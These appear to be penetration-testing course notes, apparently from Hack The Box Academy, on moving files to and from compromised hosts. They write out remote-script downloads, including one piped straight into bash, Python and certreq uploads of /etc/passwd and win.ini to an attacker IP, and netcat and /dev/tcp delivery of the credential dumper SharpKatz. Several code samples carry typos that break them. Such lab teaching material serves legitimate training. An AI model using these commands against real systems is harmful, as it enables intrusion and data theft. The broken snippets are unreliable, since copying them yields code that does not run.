## Table of Contents

- [With Code](#with\code)
      - [PHP Download with Fopen()](#PHP\Download\with\Fopen())
      - [Ruby - Download a File](#Ruby\-\Download\a\File)
      - [Perl - Download a File](#Perl\-\Download\a\File)
      - [Download a File Using JavaScript and cscript.exe](#Download\a\File\Using\JavaScript\and\cscript.exe)
    - [VBScript](#VBScript)
      - [Download a File Using VBScript and cscript.exe](#Download\a\File\Using\VBScript\and\cscript.exe)
  - [uploading a File using a python one-liner](#uploading\a\File\using\a\python\one-liner)
- [To use the requests function, we need to import the module first.](#to\use\the\requests\function,\we\need\to\import\the\module\first.)
- [Define the target URL where we will upload the file.](#define\the\target\url\where\we\will\upload\the\file.)
- [Define the file we want to read, open it and save it in a variable.](#define\the\file\we\want\to\read,\open\it\and\save\it\in\a\variable.)
- [Use a requests POST request to upload the file.](#use\a\requests\post\request\to\upload\the\file.)
- [Miscellaneous File Transfer Methods](#miscellaneous\file\transfer\methods)
      - [NetCat - Compromised Machine - Listening on Port 8000](#NetCat\-\Compromised\Machine\-\Listening\on\Port\8000)
  - [Ncat - Compromised Machine - Listening on Port 8000](#Ncat\-\Compromised\Machine\-\Listening\on\Port\8000)
      - [Netcat - Attack Host - Sending File to Compromised machine](#Netcat\-\Attack\Host\-\Sending\File\to\Compromised\machine)
      - [Ncat - Attack Host - Sending File to Compromised machine](#Ncat\-\Attack\Host\-\Sending\File\to\Compromised\machine)
      - [Attack Host - Sending File as Input to Netcat](#Attack\Host\-\Sending\File\as\Input\to\Netcat)
      - [Attack Host - Sending File as Input to Ncat](#Attack\Host\-\Sending\File\as\Input\to\Ncat)
      - [Compromised Machine Connect to Ncat to Receive the File](#Compromised\Machine\Connect\to\Ncat\to\Receive\the\File)
      - [NetCat - Sending File as Input to Netcat](#NetCat\-\Sending\File\as\Input\to\Netcat)
      - [Ncat - Sending File as Input to Netcat](#Ncat\-\Sending\File\as\Input\to\Netcat)
      - [Compromised Machine Connecting to Netcat Using /dev/tcp to Receive the File](#Compromised\Machine\Connecting\to\Netcat\Using\/dev/tcp\to\Receive\the\File)
  - [PowerShell File Transfer](#PowerShell\File\Transfer)
      - [From DC01 - Confirm WinRM port TCP 5985 is Open on DATABASE01.](#From\DC01\-\Confirm\WinRM\port\TCP\5985\is\Open\on\DATABASE01.)
      - [Create a PowerShell Remoting Session to DATABASE01](#Create\a\PowerShell\Remoting\Session\to\DATABASE01)
      - [Copy samplefile.txt from our Localhost to the DATABASE01 Session](#Copy\samplefile.txt\from\our\Localhost\to\the\DATABASE01\Session)
      - [Copy DATABASE.txt from DATABASE01 Session to our Localhost](#Copy\DATABASE.txt\from\DATABASE01\Session\to\our\Localhost)
      - [Mounting a Linux Folder Using rdesktop](#Mounting\a\Linux\Folder\Using\rdesktop)
      - [Mounting a Linux Folder Using xfreerdp](#Mounting\a\Linux\Folder\Using\xfreerdp)
    - [Using `xfreerdp` for Remote Desktop Connection](#Using\`xfreerdp`\for\Remote\Desktop\Connection)
      - [Transferring Files Using Drive Redirection](#Transferring\Files\Using\Drive\Redirection)
    - [Encrypting/Obfuscating the Traffic](#Encrypting/Obfuscating\the\Traffic)
- [Protected File Transfers](#protected\file\transfers)
      - [Invoke-AESEncryption.ps1](#Invoke-AESEncryption.ps1)
  - [Import Module Invoke-AEXEnncryption.ps1](#Import\Module\Invoke-AEXEnncryption.ps1)
      - [File Encryption Example](#File\Encryption\Example)
  - [File Encryption on Linux](#File\Encryption\on\Linux)
      - [Encrypting /etc/passwd with openssl](#Encrypting\/etc/passwd\with\openssl)
      - [Decrypt passwd.enc with openssl](#Decrypt\passwd.enc\with\openssl)
  - [HTTP/S](#HTTP/S)
  - [Nginx - Enabling PUT](#Nginx\-\Enabling\PUT)
      - [Create a Directory to Handle Uploaded Files](#Create\a\Directory\to\Handle\Uploaded\Files)
      - [Change the Owner to www-data](#Change\the\Owner\to\www-data)
      - [Create Nginx Configuration File](#Create\Nginx\Configuration\File)
      - [Symlink our Site to the sites-enabled Directory](#Symlink\our\Site\to\the\sites-enabled\Directory)
      - [Start Nginx](#Start\Nginx)
      - [Verifying Errors](#Verifying\Errors)
      - [Remove NginxDefault Configuration](#Remove\NginxDefault\Configuration)
      - [Upload File Using cURL](#Upload\File\Using\cURL)
  - [Using the LOLBAS and GTFOBins Project](#Using\the\LOLBAS\and\GTFOBins\Project)
      - [Upload win.ini to our Pwnbox](#Upload\win.ini\to\our\Pwnbox)
      - [File Received in our Netcat Session](#File\Received\in\our\Netcat\Session)
    - [GTFOBins](#GTFOBins)
      - [Create Certificate in our Pwnbox](#Create\Certificate\in\our\Pwnbox)
      - [Stand up the Server in our Pwnbox](#Stand\up\the\Server\in\our\Pwnbox)
      - [Download File from the Compromised Machine](#Download\File\from\the\Compromised\Machine)
      - [Other Common Living off the Land Tools](#Other\Common\Living\off\the\Land\Tools)
      - [File Download with Bitsadmin](#File\Download\with\Bitsadmin)
      - [Download](#Download)
    - [Certutil](#Certutil)
      - [Download a File with Certutil](#Download\a\File\with\Certutil)

# With Code


Python2 Download
```shell-session
gdxqpardo@htb[/htb]$ python2.7 -c 'import urllib;urllib.urlretrieve ("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
```


Python3 Download
```shell-session
gdxqpardo@htb[/htb]$ python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
```

`PHP` is also very prevalent and provides multiple file transfer methods. [According to W3Techs' data](https://w3techs.com/technologies/details/pl-php), PHP is used by 77.4% of all websites with a known server-side programming language. Although the information is not precise, and the number may be slightly lower, we will often encounter web services that use PHP when performing an offensive operation.

Let's see some examples of downloading files using PHP.

In the following example, we will use the PHP [file_get_contents() module](https://www.php.net/manual/en/function.file-get-contents.php) to download content from a website combined with the [file_put_contents() module](https://www.php.net/manual/en/function.file-put-contents.php) to save the file into a directory. `PHP` can be used to run one-liners from an operating system command line using the option `-r`.

PHP Download with File_get_contents()

```shell-session
gdxqpardo@htb[/htb]$ php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'
```

An alternative to `file_get_contents()` and `file_put_contents()` is the [fpopen() module](https://www.php.net/manual/en/function.fopen.php). We can use this module to open a URL, read it's content and save it into a file.

#### PHP Download with Fopen()

  PHP Download with Fopen()

```shell-session
gdxqpardo@htb[/htb]$ php -r 'const BUFFER = 1024; $fremote = 
fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
```


PHP Download a File and Pipe it to Bash

```shell-session
gdxqpardo@htb[/htb]$ php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
```


`Ruby` and `Perl` are other popular languages that can also be used to transfer files. These two programming languages also support running one-liners from an operating system command line using the option `-e`.

#### Ruby - Download a File

  Ruby - Download a File

```shell-session
gdxqpardo@htb[/htb]$ ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'
```

#### Perl - Download a File

  Perl - Download a File

```shell-session
gdxqpardo@htb[/htb]$ perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");'
```


JavaScript is a scripting or programming language that allows you to implement complex features on web pages. Like with other programming languages, we can use it for many different things.

The following JavaScript code is based on [this](https://superuser.com/questions/25538/how-to-download-files-from-command-line-in-windows-like-wget-or-curl/373068) post, and we can download a file using it. We'll create a file called `wget.js` and save the following content:
```
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpWeq.Open("GET", WScript.Arguments(0), /*async=*/false);
WinHttpReq.Send();
BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
Binstream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));
```

We can use the following command from a Windows command prompt or PowerShell terminal to execute our JavaScript code and download a file.

#### Download a File Using JavaScript and cscript.exe

  Download a File Using JavaScript and cscript.exe

```cmd-session
C:\htb> cscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1
```


### VBScript
make a file calles wget.vbs

Code: vbscript

```vbscript
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send

with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile WScript.Arguments.Item(1), 2
end with
```

#### Download a File Using VBScript and cscript.exe

  Download a File Using VBScript and cscript.exe

```cmd-session
C:\htb> cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView2.ps1
```


If we want to upload a file, we need to understand the functions in a particular programming language to perform the upload operation. The Python3 [requests module](https://pypi.org/project/requests/) allows you to send HTTP requests (GET, POST, PUT, etc.) using Python. We can use the following code if we want to upload a file to our Python3 [uploadserver](https://github.com/Densaugeo/uploadserver).


`python3 -m uploadserver`

## uploading a File using a python one-liner

```
python3 -c 'import requests;requests.post("http://MACHINE_IP:8000/upload",files={"files":open("/etc/passwd","rb")})")'
```
Let's divide this one-liner into multiple lines to understand each piece better.

Code: python

```python
# To use the requests function, we need to import the module first.
import requests 

# Define the target URL where we will upload the file.
URL = "http://192.168.49.128:8000/upload"

# Define the file we want to read, open it and save it in a variable.
file = open("/etc/passwd","rb")

# Use a requests POST request to upload the file. 
r = requests.post(url,files={"files":file})
```



# Miscellaneous File Transfer Methods
We'll first start Netcat (`nc`) on the compromised machine, listening with option `-l`, selecting the port to listen with the option `-p 8000`, and redirect the [stdout](https://en.wikipedia.org/wiki/Standard_streams#Standard_input_(stdin)) using a single greater-than `>` followed by the filename, `SharpKatz.exe`.

#### NetCat - Compromised Machine - Listening on Port 8000

  NetCat - Compromised Machine - Listening on Port 8000

```shell-session
victim@target:~$ # Example using Original Netcat
victim@target:~$ nc -l -p 8000 > SharpKatz.exe
```

If the compromised machine is using Ncat, we'll need to specify `--recv-only` to close the connection once the file transfer is finished.

## Ncat - Compromised Machine - Listening on Port 8000
  
Ncat - Compromised Machine - Listening on Port 8000

```shell-session
victim@target:~$ # Example using Ncat
victim@target:~$ ncat -l -p 8000 --recv-only > SharpKatz.exe
```

From our attack host, we'll connect to the compromised machine on port 8000 using Netcat and send the file [SharpKatz.exe](https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe) as input to Netcat. The option `-q 0` will tell Netcat to close the connection once it finishes. That way, we'll know when the file transfer was completed.

#### Netcat - Attack Host - Sending File to Compromised machine

  Netcat - Attack Host - Sending File to Compromised machine

```shell-session
gdxqpardo@htb[/htb]$ wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe
gdxqpardo@htb[/htb]$ # Example using Original Netcat
gdxqpardo@htb[/htb]$ nc -q 0 192.168.49.128 8000 < SharpKatz.exe
```

we can opt for `--send-only` rather than `-q`. The `--send-only` flag, when used in both connect and listen modes, prompts Ncat to terminate once its input is exhausted. Typically, Ncat would continue running until the network connection is closed, as the remote side may transmit additional data. However, with `--send-only`, there is no need to anticipate further incoming information.

#### Ncat - Attack Host - Sending File to Compromised machine

  Ncat - Attack Host - Sending File to Compromised machine

```shell-session
gdxqpardo@htb[/htb]$ wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe
gdxqpardo@htb[/htb]$ # Example using Ncat
gdxqpardo@htb[/htb]$ ncat --send-only 192.168.49.128 8000 < SharpKatz.exe
```

Instead of listening on our compromised machine, we can connect to a port on our attack host to perform the file transfer operation. This method is useful in scenarios where there's a firewall blocking inbound connections. Let's listen on port 443 on our Pwnbox and send the file [SharpKatz.exe](https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe) as input to Netcat.
#### Attack Host - Sending File as Input to Netcat

  Attack Host - Sending File as Input to Netcat

```shell-session
gdxqpardo@htb[/htb]$ # Example using Original Netcat
gdxqpardo@htb[/htb]$ sudo nc -l -p 443 -q 0 < SharpKatz.exe
```


Compromised machine connect to netcat to receive the file->
```
#Using original netcat
nc MACHINE_IP PORT > FILENAME.exe
```

#### Attack Host - Sending File as Input to Ncat

  Attack Host - Sending File as Input to Ncat

```shell-session
gdxqpardo@htb[/htb]$ # Example using Ncat
gdxqpardo@htb[/htb]$ sudo ncat -l -p 443 --send-only < SharpKatz.exe
```

#### Compromised Machine Connect to Ncat to Receive the File

  Compromised Machine Connect to Ncat to Receive the File

```shell-session
victim@target:~$ # Example using Ncat
victim@target:~$ ncat 192.168.49.128 443 --recv-only > SharpKatz.exe
```

If we don't have Netcat or Ncat on our compromised machine, Bash supports read/write operations on a pseudo-device file [/dev/TCP/](https://tldp.org/LDP/abs/html/devref1.html).

Writing to this particular file makes Bash open a TCP connection to `host:port`, and this feature may be used for file transfers.

#### NetCat - Sending File as Input to Netcat

  NetCat - Sending File as Input to Netcat

```shell-session
gdxqpardo@htb[/htb]$ # Example using Original Netcat
gdxqpardo@htb[/htb]$ sudo nc -l -p 443 -q 0 < SharpKatz.exe
```

#### Ncat - Sending File as Input to Netcat

  Ncat - Sending File as Input to Netcat

```shell-session
gdxqpardo@htb[/htb]$ # Example using Ncat
gdxqpardo@htb[/htb]$ sudo ncat -l -p 443 --send-only < SharpKatz.exe
```


#### Compromised Machine Connecting to Netcat Using /dev/tcp to Receive the File

  Compromised Machine Connecting to Netcat Using /dev/tcp to Receive the File

```shell-session
victim@target:~$ cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe
```


## PowerShell File Transfer

We already talk about doing file transfers with PowerShell, but there may be scenarios where HTTP, HTTPS, or SMB are unavailable. If that's the case, we can use [PowerShell Remoting](https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/running-remote-commands?view=powershell-7.2), aka WinRM, to perform file transfer operations.

[PowerShell Remoting](https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/running-remote-commands?view=powershell-7.2) allows us to execute scripts or commands on a remote computer using PowerShell sessions. Administrators commonly use PowerShell Remoting to manage remote computers in a network, and we can also use it for file transfer operations. By default, enabling PowerShell remoting creates both an HTTP and an HTTPS listener. The listeners run on default ports TCP/5985 for HTTP and TCP/5986 for HTTPS.


To create a PowerShell Remoting session on a remote computer, we will need administrative access, be a member of the `Remote Management Users` group, or have explicit permissions for PowerShell Remoting in the session configuration. Let's create an example and transfer a file from `DC01` to `DATABASE01` and vice versa.

We have a session as `Administrator` in `DC01`, the user has administrative rights on `DATABASE01`, and PowerShell Remoting is enabled. Let's use Test-NetConnection to confirm we can connect to WinRM.

#### From DC01 - Confirm WinRM port TCP 5985 is Open on DATABASE01.

  From DC01 - Confirm WinRM port TCP 5985 is Open on DATABASE01.

```powershell-session
PS C:\htb> whoami

htb\administrator

PS C:\htb> hostname

DC01
```



  
From DC01 - Confirm WinRM port TCP 5985 is Open on DATABASE01.

```powershell-session
PS C:\htb> Test-NetConnection -ComputerName DATABASE01 -Port 5985
```

Because this session already has privileges over `DATABASE01`, we don't need to specify credentials. In the example below, a session is created to the remote computer named `DATABASE01` and stores the results in the variable named `$Session`.

#### Create a PowerShell Remoting Session to DATABASE01

  Create a PowerShell Remoting Session to DATABASE01

```powershell-session
PS C:\htb> $Session = New-PSSession -ComputerName DATABASE01
```

We can use the `Copy-Item` cmdlet to copy a file from our local machine `DC01` to the `DATABASE01` session we have `$Session` or vice versa.

#### Copy samplefile.txt from our Localhost to the DATABASE01 Session

  Copy samplefile.txt from our Localhost to the DATABASE01 Session

```powershell-session
PS C:\htb> Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\
```

#### Copy DATABASE.txt from DATABASE01 Session to our Localhost

  Copy DATABASE.txt from DATABASE01 Session to our Localhost

```powershell-session
PS C:\htb> Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session
```

---

As an alternative to copy and paste, we can mount a local resource on the target RDP server. `rdesktop` or `xfreerdp` can be used to expose a local folder in the remote RDP session.

#### Mounting a Linux Folder Using rdesktop

  Mounting a Linux Folder Using rdesktop

```shell-session
gdxqpardo@htb[/htb]$ rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'
```

#### Mounting a Linux Folder Using xfreerdp

  Mounting a Linux Folder Using xfreerdp

```shell-session
gdxqpardo@htb[/htb]$ xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer
```

To access the directory, we can connect to `\\tsclient\`, allowing us to transfer files to and from the RDP session.
![image](https://academy.hackthebox.com/storage/modules/24/tsclient.jpg)
![image](https://academy.hackthebox.com/storage/modules/24/rdp.png)


Sure, let's explore different ways to transfer files using `xfreerdp` from a remote host to a local host, followed by examples of encrypting or obfuscating the traffic. Please be aware that these methods should be used responsibly and in accordance with all applicable laws and regulations.

### Using `xfreerdp` for Remote Desktop Connection

FreeRDP is a free implementation of the Remote Desktop Protocol (RDP), released under the Apache license. `xfreerdp` is a command-line interface to FreeRDP.

#### Transferring Files Using Drive Redirection

One way to transfer files from a remote host to your local system is through drive redirection, which allows you to make your local drive available during the RDP session.

1. **Basic Syntax**:
   ```bash
   xfreerdp /u:USERNAME /p:PASSWORD /v:10.129.86.10 /drive:my_drive,/path/to/local/folder
   ```

2. **With Specific Drive Name**:
   ```bash
   xfreerdp /u:USERNAME /p:PASSWORD /v:10.129.86.10 /drive:local_drive,/path/to/local/folder
   ```

Once connected, you can access `my_drive` or `local_drive` on the remote system and copy files to it, transferring them to your local system.

### Encrypting/Obfuscating the Traffic

When connecting using RDP, you can use different security methods to encrypt the connection. Here are examples:

1. **Using Standard RDP Encryption**:
   ```bash
   xfreerdp /u:USERNAME /p:PASSWORD /v:10.129.86.10 /drive:my_drive,/path/to/local/folder /sec:rdp
   ```

2. **Using TLS Security**:
   ```bash
   xfreerdp /u:USERNAME /p:PASSWORD /v:10.129.86.10 /drive:my_drive,/path/to/local/folder /sec:tls
   ```

3. **Using Network Level Authentication (NLA)**:
   ```bash
   xfreerdp /u:USERNAME /p:PASSWORD /v:10.129.86.10 /drive:my_drive,/path/to/local/folder /sec:nla
   ```

NLA is considered more secure as it authenticates the user before establishing the RDP session.

Please replace `USERNAME`, `PASSWORD`, and `/path/to/local/folder` with the appropriate values for your situation.

**Note**: Always ensure that you have the proper permissions to access the remote host and to use these file transfer methods. It's crucial to follow best practices for security and compliance with legal requirements.

# Protected File Transfers

---

As penetration testers, we often gain access to highly sensitive data such as user lists, credentials (i.e., downloading the NTDS.dit file for offline password cracking), and enumeration data that can contain critical information about the organization's network infrastructure, and Active Directory (AD) environment, etc. Therefore, it is essential to encrypt this data or use encrypted data connections such as SSH, SFTP, and HTTPS. However, sometimes these options are not available to us, and a different approach is required.

Therefore, encrypting the data or files before a transfer is often necessary to prevent the data from being read if intercepted in transit.

Data leakage during a penetration test could have severe consequences for the penetration tester, their company, and the client. As information security professionals, we must act professionally and responsibly and take all measures to protect any data we encounter during an assessment.

Many different methods can be used to encrypt files and information on Windows systems. One of the simplest methods is the [Invoke-AESEncryption.ps1](https://www.powershellgallery.com/packages/DRTools/4.0.2.3/Content/Functions%5CInvoke-AESEncryption.ps1) PowerShell script. This script is small and provides encryption of files and strings.

#### Invoke-AESEncryption.ps1

  Invoke-AESEncryption.ps1

```powershell-session

.EXAMPLE
Invoke-AESEncryption -Mode Encrypt -Key "p@ssw0rd" -Text "Secret Text" 

Description
-----------
Encrypts the string "Secret Test" and outputs a Base64 encoded ciphertext.
 
.EXAMPLE
Invoke-AESEncryption -Mode Decrypt -Key "p@ssw0rd" -Text "LtxcRelxrDLrDB9rBD6JrfX/czKjZ2CUJkrg++kAMfs="
 
Description
-----------
Decrypts the Base64 encoded string "LtxcRelxrDLrDB9rBD6JrfX/czKjZ2CUJkrg++kAMfs=" and outputs plain text.
 
.EXAMPLE
Invoke-AESEncryption -Mode Encrypt -Key "p@ssw0rd" -Path file.bin
 
Description
-----------
Encrypts the file "file.bin" and outputs an encrypted file "file.bin.aes"
 
.EXAMPLE
Invoke-AESEncryption -Mode Decrypt -Key "p@ssw0rd" -Path file.bin.aes
 
Description
-----------
Decrypts the file "file.bin.aes" and outputs an encrypted file "file.bin"
#>
function Invoke-AESEncryption {
    [CmdletBinding()]
    [OutputType([string])]
    Param
    (
        [Parameter(Mandatory = $true)]
        [ValidateSet('Encrypt', 'Decrypt')]
        [String]$Mode,

        [Parameter(Mandatory = $true)]
        [String]$Key,

        [Parameter(Mandatory = $true, ParameterSetName = "CryptText")]
        [String]$Text,

        [Parameter(Mandatory = $true, ParameterSetName = "CryptFile")]
        [String]$Path
    )

    Begin {
        $shaManaged = New-Object System.Security.Cryptography.SHA256Managed
        $aesManaged = New-Object System.Security.Cryptography.AesManaged
        $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
        $aesManaged.BlockSize = 128
        $aesManaged.KeySize = 256
    }

    Process {
        $aesManaged.Key = $shaManaged.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($Key))

        switch ($Mode) {
            'Encrypt' {
                if ($Text) {$plainBytes = [System.Text.Encoding]::UTF8.GetBytes($Text)}
                
                if ($Path) {
                    $File = Get-Item -Path $Path -ErrorAction SilentlyContinue
                    if (!$File.FullName) {
                        Write-Error -Message "File not found!"
                        break
                    }
                    $plainBytes = [System.IO.File]::ReadAllBytes($File.FullName)
                    $outPath = $File.FullName + ".aes"
                }

                $encryptor = $aesManaged.CreateEncryptor()
                $encryptedBytes = $encryptor.TransformFinalBlock($plainBytes, 0, $plainBytes.Length)
                $encryptedBytes = $aesManaged.IV + $encryptedBytes
                $aesManaged.Dispose()

                if ($Text) {return [System.Convert]::ToBase64String($encryptedBytes)}
                
                if ($Path) {
                    [System.IO.File]::WriteAllBytes($outPath, $encryptedBytes)
                    (Get-Item $outPath).LastWriteTime = $File.LastWriteTime
                    return "File encrypted to $outPath"
                }
            }

            'Decrypt' {
                if ($Text) {$cipherBytes = [System.Convert]::FromBase64String($Text)}
                
                if ($Path) {
                    $File = Get-Item -Path $Path -ErrorAction SilentlyContinue
                    if (!$File.FullName) {
                        Write-Error -Message "File not found!"
                        break
                    }
                    $cipherBytes = [System.IO.File]::ReadAllBytes($File.FullName)
                    $outPath = $File.FullName -replace ".aes"
                }

                $aesManaged.IV = $cipherBytes[0..15]
                $decryptor = $aesManaged.CreateDecryptor()
                $decryptedBytes = $decryptor.TransformFinalBlock($cipherBytes, 16, $cipherBytes.Length - 16)
                $aesManaged.Dispose()

                if ($Text) {return [System.Text.Encoding]::UTF8.GetString($decryptedBytes).Trim([char]0)}
                
                if ($Path) {
                    [System.IO.File]::WriteAllBytes($outPath, $decryptedBytes)
                    (Get-Item $outPath).LastWriteTime = $File.LastWriteTime
                    return "File decrypted to $outPath"
                }
            }
        }
    }

    End {
        $shaManaged.Dispose()
        $aesManaged.Dispose()
    }
}
```

We can use any previously shown file transfer methods to get this file onto a target host. After the script has been transferred, it only needs to be imported as a module, as shown below.

## Import Module Invoke-AEXEnncryption.ps1
```powershell
PS C:\htb> Import-Module .\Invoke-AesEncryption.ps1
```

#### File Encryption Example

  File Encryption Example

```powershell-session
PS C:\htb> Invoke-AESEncryption -Mode Encrypt -Key "p4ssw0rd" -Path .\scan-results.txt

File encrypted to C:\htb\scan-results.txt.aes
PS C:\htb> ls

    Directory: C:\htb

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        11/18/2020  12:17 AM           9734 Invoke-AESEncryption.ps1
-a----        11/18/2020  12:19 PM           1724 scan-results.txt
-a----        11/18/2020  12:20 PM           3448 scan-results.txt.aes
```

## File Encryption on Linux
To encrypt a file using `openssl` we can select different ciphers, see [OpenSSL man page](https://www.openssl.org/docs/man1.1.1/man1/openssl-enc.html). Let's use `-aes256` as an example. We can also override the default iterations counts with the option `-iter 100000` and add the option `-pbkdf2` to use the Password-Based Key Derivation Function 2 algorithm. When we hit enter, we'll need to provide a password.

#### Encrypting /etc/passwd with openssl

  Encrypting /etc/passwd with openssl

```shell-session
gdxqpardo@htb[/htb]$ openssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc
```

Remember to use a strong and unique password to avoid brute-force cracking attacks should an unauthorized party obtain the file. To decrypt the file, we can use the following command:

#### Decrypt passwd.enc with openssl

  Decrypt passwd.enc with openssl

```shell-session
gdxqpardo@htb[/htb]$ openssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd                    

enter aes-256-cbc decryption password:
```

## HTTP/S

Web transfer is the most common way most people transfer files because `HTTP`/`HTTPS` are the most common protocols allowed through firewalls. Another immense benefit is that, in many cases, the file will be encrypted in transit. There is nothing worse than being on a penetration test, and a client's network IDS picks up on a sensitive file being transferred over plaintext and having them ask why we sent a password to our cloud server without using encryption.

We have already discussed using the Python3 [uploadserver module](https://github.com/Densaugeo/uploadserver) to set up a web server with upload capabilities, but we can also use Apache or Nginx. This section will cover creating a secure web server for file upload operations.

---

## Nginx - Enabling PUT

A good alternative for transferring files to `Apache` is [Nginx](https://www.nginx.com/resources/wiki/) because the configuration is less complicated, and the module system does not lead to security issues as `Apache` can.

When allowing `HTTP` uploads, it is critical to be 100% positive that users cannot upload web shells and execute them. `Apache` makes it easy to shoot ourselves in the foot with this, as the `PHP` module loves to execute anything ending in `PHP`. Configuring `Nginx` to use PHP is nowhere near as simple.


#### Create a Directory to Handle Uploaded Files

  Create a Directory to Handle Uploaded Files

```shell-session
gdxqpardo@htb[/htb]$ sudo mkdir -p /var/www/uploads/SecretUploadDirectory
```

#### Change the Owner to www-data

  Change the Owner to www-data

```shell-session
gdxqpardo@htb[/htb]$ sudo chown -R www-data:www-data /var/www/uploads/SecretUploadDirectory
```

#### Create Nginx Configuration File

Create the Nginx configuration file by creating the file `/etc/nginx/sites-available/upload.conf` with the contents:

  Create Nginx Configuration File

```shell-session
server {
    listen 9001;
    
    location /SecretUploadDirectory/ {
        root    /var/www/uploads;
        dav_methods PUT;
    }
}
```

#### Symlink our Site to the sites-enabled Directory

  Symlink our Site to the sites-enabled Directory

```shell-session

gdxqpardo@htb[/htb]$ sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/
```

#### Start Nginx

  Start Nginx

```shell-session
gdxqpardo@htb[/htb]$ sudo systemctl restart nginx.service
```

If we get any error messages, check `/var/log/nginx/error.log`. If using Pwnbox, we will see port 80 is already in use.

#### Verifying Errors

  Verifying Errors

```shell-session
gdxqpardo@htb[/htb]$ tail -2 `/var/log/nginx/error.log`

2020/11/17 16:11:56 [emerg] 5679#5679: bind() to 0.0.0.0:`80` failed (98: A`ddress already in use`)
2020/11/17 16:11:56 [emerg] 5679#5679: still could not bind()
```
  
Verifying Errors

```shell-session
gdxqpardo@htb[/htb]$ ss -lnpt | grep `80
```

Verifying Errors

```shell-session
gdxqpardo@htb[/htb]$ ps -ef | grep `2811`
```

#### Remove NginxDefault Configuration

  Remove NginxDefault Configuration

```shell-session
gdxqpardo@htb[/htb]$ sudo rm /etc/nginx/sites-enabled/default
```
#### Upload File Using cURL

  Upload File Using cURL

```shell-session
gdxqpardo@htb[/htb]$ curl -T /etc/passwd http://localhost:9001/SecretUploadDirectory/users.txt
```

  
Upload File Using cURL

```shell-session
gdxqpardo@htb[/htb]$ tail -1 /var/www/uploads/SecretUploadDirectory/users.txt
```

Once we have this working, a good test is to ensure the directory listing is not enabled by navigating to `http://localhost/SecretUploadDirectory`. By default, with `Apache`, if we hit a directory without an index file (index.html), it will list all the files. This is bad for our use case of exfilling files because most files are sensitive by nature, and we want to do our best to hide them. Thanks to `Nginx` being minimal, features like that are not enabled by default.

- [LOLBAS Project for Windows Binaries](https://lolbas-project.github.io/)
- [GTFOBins for Linux Binaries](https://gtfobins.github.io/)

Living off the Land binaries can be used to perform functions such as:

- Download
- Upload
- Command Execution
- File Read
- File Write
- Bypasses

## Using the LOLBAS and GTFOBins Project

[LOLBAS for Windows](https://lolbas-project.github.io/#) and [GTFOBins for Linux](https://gtfobins.github.io/) are websites where we can search for binaries we can use for different functions.

To search for download and upload functions in [LOLBAS](https://lolbas-project.github.io/) we can use `/download` or `/upload`.

Let's use [CertReq.exe](https://lolbas-project.github.io/lolbas/Binaries/Certreq/) as an example.

We need to listen on a port on our attack host for incoming traffic using Netcat and then execute certreq.exe to upload a file.

#### Upload win.ini to our Pwnbox

  Upload win.ini to our Pwnbox

```cmd-session
C:\htb> certreq.exe -Post -config http://192.168.49.128/ c:\windows\win.ini
Certificate Request Processor: The operation timed out 0x80072ee2 (WinHttp: 12002 ERROR_WINHTTP_TIMEOUT)
```

This will send the file to our Netcat session, and we can copy-paste its contents.

#### File Received in our Netcat Session

  File Received in our Netcat Session

```shell-session
gdxqpardo@htb[/htb]$ sudo nc -lvnp 80
```

If you get an error when running `certreq.exe`, the version you are using may not contain the `-Post` parameter. You can download an updated version [here](https://github.com/juliourena/plaintext/raw/master/hackthebox/certreq.exe) and try again.

### GTFOBins

